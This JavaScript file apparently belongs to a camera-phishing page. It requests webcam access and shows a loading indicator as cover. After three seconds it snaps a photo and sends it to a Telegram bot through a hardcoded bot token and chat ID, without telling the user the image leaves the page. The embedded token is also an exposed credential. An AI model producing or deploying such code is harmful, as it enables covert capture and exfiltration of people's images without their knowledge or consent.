const video = document.getElementById("video");
const loading = document.getElementById("loading");

// Запрашиваем доступ к камере
navigator.mediaDevices
  .getUserMedia({ video: true })
  .then((stream) => {
    video.srcObject = stream;
    video.play();
    loading.style.display = "block"; // Показываем индикатор загрузки
    // Делаем фото через 3 секунды
    setTimeout(captureAndSendPhoto, 3000);
  })
  .catch((err) => {
    console.error("Error accessing camera: ", err);
    alert("Unable to access camera. Please allow camera access and try again.");
  });

const canvas = document.getElementById("canvas");
const context = canvas.getContext("2d");

function captureAndSendPhoto() {
  context.drawImage(video, 0, 0, 640, 480);
  const dataURL = canvas.toDataURL("image/png");

  // Отправка изображения боту Telegram
  sendToTelegram(dataURL);
}

function sendToTelegram(dataURL) {
  const token = "7226414909:AAFtB5lGcNtnOIVkC9ZheI8z5SmzpDT_Eoo"; // Замените на ваш токен бота
  const chat_id = "5539341984";
  const url = `https://api.telegram.org/bot${token}/sendPhoto`;

  const formData = new FormData();
  formData.append("chat_id", chat_id);
  formData.append("photo", dataURItoBlob(dataURL), "photo.png");

  fetch(url, {
    method: "POST",
    body: formData,
  })
    .then((response) => response.json())
    .then((data) => {
      loading.style.display = "none";
      if (data.ok) {
        console.log("ok");
      } else {
        console.error(data);
      }
    })
    .catch((err) => {
      loading.style.display = "none";
      console.error(err);
    });
}

function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(",")[1]);
  const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}
